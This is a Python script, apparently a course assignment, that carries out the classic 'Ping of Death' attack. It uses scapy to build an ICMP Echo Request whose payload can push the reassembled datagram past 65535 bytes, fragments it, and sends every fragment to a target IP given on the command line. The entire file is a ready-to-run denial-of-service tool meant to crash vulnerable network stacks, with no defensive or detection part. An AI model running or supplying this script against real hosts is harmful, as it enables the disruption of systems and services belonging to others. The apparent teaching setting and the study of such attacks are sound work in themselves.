#!/usr/bin/env python3
"""
Assignment 3: Ping of Death

Usage: sudo python3 ping_of_death.py <target_ip> <payload_size>

Sends a fragmented ICMP Echo Request whose reassembled payload exceeds
the maximum IP datagram size (65535 bytes).  The classic "Ping of Death"
exploits the fact that some network stacks cannot handle reassembled
packets larger than 65535 bytes, causing crashes or undefined behaviour.

payload_size: total ICMP payload in bytes (must be > 65508 to exceed
              the 65535 IP limit after headers).
"""

import sys
import os

try:
    from scapy.all import IP, ICMP, fragment, send, Raw
except ImportError:
    print("Error: scapy is required.  Install with: pip install scapy",
          file=sys.stderr)
    sys.exit(1)


def usage():
    print(f"Usage: sudo {sys.argv[0]} <target_ip> <payload_size>")
    print("  target_ip    - IPv4 address of the target")
    print("  payload_size - ICMP payload size in bytes (e.g. 65535)")
    sys.exit(1)


def validate_ip(ip_str: str) -> str:
    """Basic IPv4 validation."""
    parts = ip_str.split(".")
    if len(parts) != 4:
        return ""
    for p in parts:
        try:
            val = int(p)
        except ValueError:
            return ""
        if val < 0 or val > 255:
            return ""
    return ip_str


def main():
    if len(sys.argv) != 3:
        usage()

    target_ip = validate_ip(sys.argv[1])
    if not target_ip:
        print(f"Error: invalid target IP '{sys.argv[1]}'", file=sys.stderr)
        sys.exit(1)

    try:
        payload_size = int(sys.argv[2])
    except ValueError:
        print(f"Error: invalid payload size '{sys.argv[2]}'", file=sys.stderr)
        sys.exit(1)

    if payload_size < 1 or payload_size > 131072:
        print("Error: payload_size should be between 1 and 131072",
              file=sys.stderr)
        sys.exit(1)

    if os.geteuid() != 0:
        print("Warning: this script typically needs root privileges.",
              file=sys.stderr)

    # Construct the oversized ICMP packet.
    # IP header = 20 bytes, ICMP header = 8 bytes.
    # Normal max payload = 65535 - 20 - 8 = 65507 bytes.
    # Anything above 65507 causes the reassembled IP datagram to exceed 65535.
    print(f"[*] Ping of Death -> {target_ip}")
    print(f"[*] Payload size:  {payload_size} bytes")

    if payload_size > 65507:
        print("[*] Reassembled packet will EXCEED 65535 bytes (classic PoD)")
    else:
        print("[*] Note: payload fits in a normal datagram; "
              "use > 65507 for a true Ping of Death")

    # Build the packet
    payload = Raw(load=b"X" * payload_size)
    pkt = IP(dst=target_ip) / ICMP() / payload

    # Fragment manually
    # MTU of 1500 is standard; IP payload per fragment should equal 1480 bytes
    fragments = fragment(pkt, fragsize=1480)

    print(f"[*] Fragmented into {len(fragments)} fragments")

    for i, frag in enumerate(fragments):
        send(frag, verbose=False)
        if (i + 1) % 10 == 0:
            print(f"    Sent {i + 1}/{len(fragments)} fragments...")

    print(f"[*] All {len(fragments)} fragments sent successfully.")


if __name__ == "__main__":
    main()
